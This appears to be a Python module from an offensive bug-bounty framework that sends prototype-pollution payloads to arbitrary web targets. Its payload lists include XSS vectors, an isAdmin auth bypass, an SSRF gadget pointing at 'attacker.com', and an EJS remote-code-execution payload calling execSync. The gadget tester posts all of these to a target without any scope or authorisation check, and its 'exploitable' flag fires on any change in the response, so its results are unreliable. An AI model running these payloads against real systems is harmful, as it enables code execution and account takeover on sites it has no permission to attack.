"""
DORAKULA - Prototype Pollution Tester Module
==============================================
Advanced prototype pollution vulnerability detection for bug bounty.
Tests client-side and server-side prototype pollution via various
injection vectors and known gadgets.

Author: DORAKULA Framework
"""

import asyncio
import json
import logging
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

import aiohttp

logger = logging.getLogger("dorakula.prototype_pollution")


# Known pollution sources and their injection vectors
POLLUTION_SOURCES: List[Dict[str, Any]] = [
    {
        "name": "__proto__",
        "payloads": [
            "__proto__[polluted]=d0r4kul4",
            "__proto__.polluted=d0r4kul4",
            "__proto__[polluted]=d0r4kul4",
        ],
        "json_payloads": [
            {"__proto__": {"polluted": "d0r4kul4"}},
            {"__proto__": {"polluted": "d0r4kul4", "isAdmin": True}},
        ],
    },
    {
        "name": "constructor.prototype",
        "payloads": [
            "constructor[prototype][polluted]=d0r4kul4",
            "constructor.prototype.polluted=d0r4kul4",
            "constructor[prototype][polluted]=d0r4kul4",
        ],
        "json_payloads": [
            {"constructor": {"prototype": {"polluted": "d0r4kul4"}}},
            {"constructor": {"prototype": {"polluted": "d0r4kul4", "isAdmin": True}}},
        ],
    },
    {
        "name": "Object.assign",
        "payloads": [
            "Object.assign[prototype][polluted]=d0r4kul4",
        ],
        "json_payloads": [
            {"Object": {"assign": {"prototype": {"polluted": "d0r4kul4"}}}},
        ],
    },
]

# Known pollution gadgets that can be exploited
KNOWN_GADGETS: List[Dict[str, Any]] = [
    {
        "name": "xss_via_innerHTML",
        "description": "Prototype pollution to XSS via innerHTML sink",
        "payload": {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}},
        "sink": "innerHTML",
    },
    {
        "name": "xss_via_src",
        "description": "Prototype pollution to XSS via script src",
        "payload": {"__proto__": {"src": "javascript:alert(1)"}},
        "sink": "src",
    },
    {
        "name": "xss_via_href",
        "description": "Prototype pollution to XSS via href",
        "payload": {"__proto__": {"href": "javascript:alert(1)"}},
        "sink": "href",
    },
    {
        "name": "auth_bypass_via_isAdmin",
        "description": "Prototype pollution to bypass auth via isAdmin",
        "payload": {"__proto__": {"isAdmin": True}},
        "sink": "isAdmin",
    },
    {
        "name": "ssrf_via_baseURL",
        "description": "Prototype pollution to SSRF via baseURL",
        "payload": {"__proto__": {"baseURL": "http://attacker.com/"}},
        "sink": "baseURL",
    },
    {
        "name": "rce_via_shell",
        "description": "Server-side prototype pollution to RCE",
        "payload": {"__proto__": {"shell": "/bin/bash", "env": {"NODE_OPTIONS": "--require /proc/self/environ"}}},
        "sink": "shell",
    },
    {
        "name": "ejs_rce",
        "description": "EJS template engine RCE via prototype pollution",
        "payload": {"__proto__": {"outputFunctionName": "a;return process.mainModule.require('child_process').execSync('id')//"}},
        "sink": "outputFunctionName",
    },
    {
        "name": "handlebars_rce",
        "description": "Handlebars template engine RCE via prototype pollution",
        "payload": {"__proto__": {"allowProtoPropertiesByDefault": True, "allowProtoMethodsByDefault": True}},
        "sink": "allowProtoPropertiesByDefault",
    },
]


class PrototypePollutionTester:
    """Tests for prototype pollution vulnerabilities in web applications.

    Supports both client-side (DOM-based) and server-side prototype
    pollution testing via URL parameters, JSON bodies, and headers.
    Includes AI-generated payloads and known gadget testing.
    """

    def __init__(self, ai_router: Optional[Any] = None, timeout: int = 30) -> None:
        """Initialize the PrototypePollutionTester.

        Args:
            ai_router: AI router instance for enhanced analysis.
            timeout: Request timeout in seconds.
        """
        self.ai_router = ai_router
        self.timeout = timeout
        self.session: Optional[aiohttp.ClientSession] = None
        logger.info("PrototypePollutionTester initialized with timeout=%d", timeout)

    async def _get_session(self) -> aiohttp.ClientSession:
        """Get or create an aiohttp session.

        Returns:
            Active aiohttp.ClientSession instance.
        """
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=self.timeout)
            )
        return self.session

    async def close(self) -> None:
        """Close the aiohttp session and clean up resources."""
        if self.session and not self.session.closed:
            await self.session.close()
            logger.debug("aiohttp session closed")

    async def _ai_analyze(self, analysis: Dict[str, Any], context: str) -> Dict[str, Any]:
        """Use AI router for enhanced analysis.

        Args:
            analysis: Raw analysis results.
            context: Test type context string.

        Returns:
            AI-enhanced analysis dictionary.
        """
        if self.ai_router is None:
            analysis["ai_analysis"] = "AI router not configured"
            analysis["confidence"] = 0.5
            return analysis

        try:
            prompt = (
                f"Analyze this prototype pollution test result for '{context}'. "
                f"Determine if it is a true positive or false positive. "
                f"Rate confidence 0.0-1.0. Results: {analysis}"
            )
            ai_result = await self.ai_router.analyze(prompt)
            analysis["ai_analysis"] = ai_result.get("summary", "")
            analysis["confidence"] = ai_result.get("confidence", 0.5)
        except (ConnectionError, TimeoutError, ValueError) as exc:
            logger.warning("AI analysis failed: %s", exc)
            analysis["ai_analysis"] = f"AI analysis error: {exc}"
            analysis["confidence"] = 0.5

        return analysis

    async def _test_via_url_params(
        self, url: str, payload_str: str
    ) -> Tuple[int, str]:
        """Test prototype pollution via URL parameters.

        Args:
            url: Target URL.
            payload_str: URL-encoded payload string.

        Returns:
            Tuple of (status_code, response_body).
        """
        session = await self._get_session()
        separator = "&" if "?" in url else "?"
        test_url = f"{url}{separator}{payload_str}"
        try:
            async with session.get(test_url) as resp:
                body = await resp.text()
                return resp.status, body[:5000]
        except aiohttp.ClientError as exc:
            logger.debug("URL param test failed: %s", exc)
            return 0, ""

    async def _test_via_json_body(
        self, url: str, json_payload: Dict[str, Any]
    ) -> Tuple[int, str]:
        """Test prototype pollution via JSON POST body.

        Args:
            url: Target URL.
            json_payload: JSON payload dictionary.

        Returns:
            Tuple of (status_code, response_body).
        """
        session = await self._get_session()
        try:
            async with session.post(url, json=json_payload) as resp:
                body = await resp.text()
                return resp.status, body[:5000]
        except aiohttp.ClientError as exc:
            logger.debug("JSON body test failed: %s", exc)
            return 0, ""

    async def _test_via_headers(
        self, url: str, payload_str: str
    ) -> Tuple[int, str]:
        """Test prototype pollution via custom headers.

        Args:
            url: Target URL.
            payload_str: Header payload string.

        Returns:
            Tuple of (status_code, response_body).
        """
        session = await self._get_session()
        # Parse payload into header format
        headers = {"X-Prototype-Pollution": payload_str}
        try:
            async with session.get(url, headers=headers) as resp:
                body = await resp.text()
                return resp.status, body[:5000]
        except aiohttp.ClientError as exc:
            logger.debug("Header test failed: %s", exc)
            return 0, ""

    def _check_pollution_indicators(self, body: str) -> bool:
        """Check response body for prototype pollution indicators.

        Args:
            body: Response body text.

        Returns:
            True if pollution indicators are found.
        """
        indicators = [
            "d0r4kul4",
            "polluted",
            "__proto__",
            "constructor.prototype",
            "isAdmin",
        ]
        body_lower = body.lower()
        return any(ind.lower() in body_lower for ind in indicators)

    async def test_pollution(self, target: str) -> Dict[str, Any]:
        """Test for prototype pollution using all injection vectors.

        Comprehensive test covering URL parameters, JSON bodies,
        and headers with all known pollution sources.

        Args:
            target: Target URL to test.

        Returns:
            Dictionary with prototype pollution test results.
        """
        logger.info("Testing prototype pollution on %s", target)

        try:
            # First, get baseline response
            session = await self._get_session()
            async with session.get(target) as resp:
                baseline_status = resp.status
                baseline_body = await resp.text()

            results: List[Dict[str, Any]] = []

            for source in POLLUTION_SOURCES:
                # Test via URL parameters
                for payload_str in source["payloads"]:
                    status, body = await self._test_via_url_params(target, payload_str)
                    pollution_detected = self._check_pollution_indicators(body)
                    response_changed = body != baseline_body and status != baseline_status

                    results.append({
                        "source": source["name"],
                        "vector": "url_params",
                        "payload": payload_str,
                        "status_code": status,
                        "pollution_detected": pollution_detected,
                        "response_changed": response_changed,
                        "potential_vulnerability": pollution_detected or response_changed,
                    })

                # Test via JSON body
                for json_payload in source["json_payloads"]:
                    status, body = await self._test_via_json_body(target, json_payload)
                    pollution_detected = self._check_pollution_indicators(body)
                    response_changed = body != baseline_body and status != baseline_status

                    results.append({
                        "source": source["name"],
                        "vector": "json_body",
                        "payload": json.dumps(json_payload),
                        "status_code": status,
                        "pollution_detected": pollution_detected,
                        "response_changed": response_changed,
                        "potential_vulnerability": pollution_detected or response_changed,
                    })

                # Test via headers
                for payload_str in source["payloads"][:1]:
                    status, body = await self._test_via_headers(target, payload_str)
                    pollution_detected = self._check_pollution_indicators(body)
                    response_changed = body != baseline_body and status != baseline_status

                    results.append({
                        "source": source["name"],
                        "vector": "headers",
                        "payload": payload_str,
                        "status_code": status,
                        "pollution_detected": pollution_detected,
                        "response_changed": response_changed,
                        "potential_vulnerability": pollution_detected or response_changed,
                    })

            vulnerable_results = [r for r in results if r["potential_vulnerability"]]
            analysis = {
                "target": target,
                "total_tests": len(results),
                "vulnerable_tests": len(vulnerable_results),
                "results": results,
                "vulnerable": len(vulnerable_results) > 0,
            }
            analysis = await self._ai_analyze(analysis, "prototype_pollution")
            return analysis

        except aiohttp.ClientError as exc:
            logger.error("Prototype pollution test failed: %s", exc)
            return {"error": str(exc), "target": target, "vulnerable": False}
        finally:
            await self.close()

    async def test_client_side(self, target: str) -> Dict[str, Any]:
        """Test for client-side prototype pollution via DOM.

        Checks if URL parameters can pollute Object.prototype
        in the browser context by testing various injection patterns.

        Args:
            target: Target URL to test.

        Returns:
            Dictionary with client-side pollution test results.
        """
        logger.info("Testing client-side prototype pollution on %s", target)

        try:
            # Client-side pollution payloads for URL parameters
            cs_payloads: List[Dict[str, str]] = [
                {"param": "__proto__[test]", "value": "d0r4kul4"},
                {"param": "constructor[prototype][test]", "value": "d0r4kul4"},
                {"param": "__proto__.test", "value": "d0r4kul4"},
                {"param": "constructor.prototype.test", "value": "d0r4kul4"},
                # Deep nested pollution
                {"param": "__proto__[__proto__][test]", "value": "d0r4kul4"},
                # Via query string parsing
                {"param": "__proto__", "value": '{"test":"d0r4kul4"}'},
            ]

            results: List[Dict[str, Any]] = []
            session = await self._get_session()

            for payload in cs_payloads:
                # Build test URL
                parsed = urlparse(target)
                existing_params = parse_qs(parsed.query)
                existing_params[payload["param"]] = [payload["value"]]
                new_query = urlencode(existing_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                try:
                    async with session.get(test_url) as resp:
                        body = await resp.text()
                        # Check if the pollution is reflected in the page
                        reflected = payload["value"] in body or "d0r4kul4" in body
                        pollution_indicators = self._check_pollution_indicators(body)

                        results.append({
                            "param": payload["param"],
                            "value": payload["value"],
                            "reflected": reflected,
                            "pollution_indicators": pollution_indicators,
                            "test_url": test_url,
                            "potential_vulnerability": reflected or pollution_indicators,
                        })
                except aiohttp.ClientError as exc:
                    results.append({
                        "param": payload["param"],
                        "value": payload["value"],
                        "error": str(exc),
                        "potential_vulnerability": False,
                    })

            vulnerable_results = [r for r in results if r["potential_vulnerability"]]
            analysis = {
                "target": target,
                "test_type": "client_side",
                "total_tests": len(results),
                "vulnerable_tests": len(vulnerable_results),
                "results": results,
                "vulnerable": len(vulnerable_results) > 0,
            }
            analysis = await self._ai_analyze(analysis, "client_side_pollution")
            return analysis

        except aiohttp.ClientError as exc:
            logger.error("Client-side pollution test failed: %s", exc)
            return {"error": str(exc), "target": target, "vulnerable": False}
        finally:
            await self.close()

    async def test_server_side(self, target: str) -> Dict[str, Any]:
        """Test for server-side prototype pollution.

        Sends JSON payloads designed to pollute Object.prototype
        on the server, then checks for behavioral changes.

        Args:
            target: Target URL to test.

        Returns:
            Dictionary with server-side pollution test results.
        """
        logger.info("Testing server-side prototype pollution on %s", target)

        try:
            session = await self._get_session()

            # Get baseline
            async with session.get(target) as resp:
                baseline_status = resp.status
                baseline_body = await resp.text()

            # Server-side pollution payloads
            ss_payloads: List[Dict[str, Any]] = [
                # Basic pollution
                {
                    "name": "basic_proto",
                    "json": {"__proto__": {"polluted": "d0r4kul4"}},
                    "verify_header": "X-Polluted",
                },
                {
                    "name": "constructor_prototype",
                    "json": {"constructor": {"prototype": {"polluted": "d0r4kul4"}}},
                    "verify_header": "X-Polluted",
                },
                # Deep merge pollution
                {
                    "name": "deep_merge_proto",
                    "json": {
                        "data": {"__proto__": {"polluted": "d0r4kul4"}},
                        "type": "merge",
                    },
                    "verify_header": None,
                },
                # Pollution via array constructor
                {
                    "name": "array_constructor",
                    "json": {"constructor": {"prototype": {"polluted": "d0r4kul4"}}},
                    "verify_header": None,
                },
            ]

            results: List[Dict[str, Any]] = []

            for payload in ss_payloads:
                # Send pollution payload
                try:
                    async with session.post(
                        target, json=payload["json"]
                    ) as resp:
                        pollute_status = resp.status
                        pollute_body = await resp.text()
                        pollute_headers = dict(resp.headers)
                except aiohttp.ClientError as exc:
                    results.append({
                        "payload_name": payload["name"],
                        "error": str(exc),
                        "potential_vulnerability": False,
                    })
                    continue

                # Verify pollution by making a follow-up request
                try:
                    async with session.get(target) as resp:
                        verify_status = resp.status
                        verify_body = await resp.text()
                        verify_headers = dict(resp.headers)
                except aiohttp.ClientError as exc:
                    results.append({
                        "payload_name": payload["name"],
                        "error": str(exc),
                        "potential_vulnerability": False,
                    })
                    continue

                # Check for pollution effects
                body_changed = verify_body != baseline_body
                status_changed = verify_status != baseline_status
                polluted_header_present = (
                    payload["verify_header"] is not None
                    and payload["verify_header"] in {
                        k.lower() for k in verify_headers
                    }
                )
                pollution_reflected = "d0r4kul4" in verify_body

                results.append({
                    "payload_name": payload["name"],
                    "pollute_status": pollute_status,
                    "verify_status": verify_status,
                    "body_changed": body_changed,
                    "status_changed": status_changed,
                    "polluted_header_present": polluted_header_present,
                    "pollution_reflected": pollution_reflected,
                    "potential_vulnerability": (
                        body_changed or status_changed
                        or polluted_header_present or pollution_reflected
                    ),
                })

            vulnerable_results = [r for r in results if r["potential_vulnerability"]]
            analysis = {
                "target": target,
                "test_type": "server_side",
                "total_tests": len(results),
                "vulnerable_tests": len(vulnerable_results),
                "results": results,
                "vulnerable": len(vulnerable_results) > 0,
            }
            analysis = await self._ai_analyze(analysis, "server_side_pollution")
            return analysis

        except aiohttp.ClientError as exc:
            logger.error("Server-side pollution test failed: %s", exc)
            return {"error": str(exc), "target": target, "vulnerable": False}
        finally:
            await self.close()

    async def generate_payloads(self, target: str) -> Dict[str, Any]:
        """Generate AI-enhanced prototype pollution payloads.

        Analyzes the target and generates context-aware payloads
        tailored to the specific application.

        Args:
            target: Target URL to generate payloads for.

        Returns:
            Dictionary with generated payloads.
        """
        logger.info("Generating prototype pollution payloads for %s", target)

        try:
            session = await self._get_session()

            # Fetch target to analyze
            async with session.get(target) as resp:
                page_content = await resp.text()

            # Base payloads from known sources
            base_payloads: List[Dict[str, Any]] = []
            for source in POLLUTION_SOURCES:
                for i, payload_str in enumerate(source["payloads"]):
                    base_payloads.append({
                        "name": f"{source['name']}_url_{i}",
                        "vector": "url_params",
                        "payload": payload_str,
                    })
                for i, json_payload in enumerate(source["json_payloads"]):
                    base_payloads.append({
                        "name": f"{source['name']}_json_{i}",
                        "vector": "json_body",
                        "payload": json_payload,
                    })

            # Check for frameworks that may have specific gadgets
            framework_gadgets: List[str] = []
            framework_indicators = {
                "react": ["react", "react-dom", "__NEXT_DATA__"],
                "vue": ["vue.js", "vue.min.js", "__vue__"],
                "angular": ["angular.js", "angular.min.js", "ng-version"],
                "express": ["x-powered-by: express"],
                "nextjs": ["__NEXT_DATA__", "_next/"],
                "nuxtjs": ["__NUXT__", "_nuxt/"],
            }

            page_lower = page_content.lower()
            for framework, indicators in framework_indicators.items():
                if any(ind.lower() in page_lower for ind in indicators):
                    framework_gadgets.append(framework)

            # AI-enhanced payload generation
            ai_payloads: List[Dict[str, Any]] = []
            if self.ai_router is not None:
                try:
                    prompt = (
                        f"Based on target analysis for {target}, "
                        f"frameworks detected: {framework_gadgets}, "
                        f"generate additional prototype pollution payloads. "
                        f"Focus on framework-specific gadgets."
                    )
                    ai_result = await self.ai_router.analyze(prompt)
                    if isinstance(ai_result, dict) and "payloads" in ai_result:
                        ai_payloads = ai_result["payloads"]
                except (ConnectionError, TimeoutError, ValueError) as exc:
                    logger.warning("AI payload generation failed: %s", exc)

            all_payloads = base_payloads + ai_payloads

            analysis = {
                "target": target,
                "frameworks_detected": framework_gadgets,
                "base_payloads": len(base_payloads),
                "ai_payloads": len(ai_payloads),
                "total_payloads": len(all_payloads),
                "payloads": all_payloads,
            }
            return analysis

        except aiohttp.ClientError as exc:
            logger.error("Payload generation failed: %s", exc)
            return {"error": str(exc), "target": target, "payloads": []}
        finally:
            await self.close()

    async def test_gadgets(self, target: str) -> Dict[str, Any]:
        """Test known prototype pollution gadgets.

        Tests each known gadget payload to determine if the application
        is vulnerable to exploitation through polluted prototypes.

        Args:
            target: Target URL to test gadgets on.

        Returns:
            Dictionary with gadget test results.
        """
        logger.info("Testing prototype pollution gadgets on %s", target)

        try:
            session = await self._get_session()

            # Get baseline
            async with session.get(target) as resp:
                baseline_status = resp.status
                baseline_body = await resp.text()

            results: List[Dict[str, Any]] = []

            for gadget in KNOWN_GADGETS:
                # Send pollution payload first
                try:
                    async with session.post(
                        target, json=gadget["payload"]
                    ) as resp:
                        pollute_status = resp.status
                        pollute_body = await resp.text()
                except aiohttp.ClientError as exc:
                    results.append({
                        "gadget": gadget["name"],
                        "sink": gadget["sink"],
                        "error": str(exc),
                        "exploitable": False,
                    })
                    continue

                # Verify by sending a follow-up request
                try:
                    async with session.get(target) as resp:
                        verify_status = resp.status
                        verify_body = await resp.text()
                except aiohttp.ClientError as exc:
                    results.append({
                        "gadget": gadget["name"],
                        "sink": gadget["sink"],
                        "error": str(exc),
                        "exploitable": False,
                    })
                    continue

                # Check for exploitation indicators
                body_changed = verify_body != baseline_body
                status_changed = verify_status != baseline_status

                # Check for specific gadget indicators
                exploit_indicators = {
                    "innerHTML": "<img" in verify_body,
                    "src": "javascript:" in verify_body,
                    "href": "javascript:" in verify_body,
                    "isAdmin": "admin" in verify_body.lower() or verify_status != baseline_status,
                    "baseURL": "attacker.com" in verify_body,
                    "outputFunctionName": "process" in verify_body or "mainModule" in verify_body,
                    "allowProtoPropertiesByDefault": body_changed,
                }

                indicator_triggered = exploit_indicators.get(gadget["sink"], body_changed)

                results.append({
                    "gadget": gadget["name"],
                    "description": gadget["description"],
                    "sink": gadget["sink"],
                    "payload": gadget["payload"],
                    "body_changed": body_changed,
                    "status_changed": status_changed,
                    "indicator_triggered": indicator_triggered,
                    "exploitable": body_changed or status_changed or indicator_triggered,
                })

            exploitable_gadgets = [r for r in results if r["exploitable"]]
            analysis = {
                "target": target,
                "test_type": "gadget_testing",
                "total_gadgets": len(results),
                "exploitable_gadgets": exploitable_gadgets,
                "results": results,
                "vulnerable": len(exploitable_gadgets) > 0,
            }
            analysis = await self._ai_analyze(analysis, "pollution_gadgets")
            return analysis

        except aiohttp.ClientError as exc:
            logger.error("Gadget testing failed: %s", exc)
            return {"error": str(exc), "target": target, "vulnerable": False}
        finally:
            await self.close()
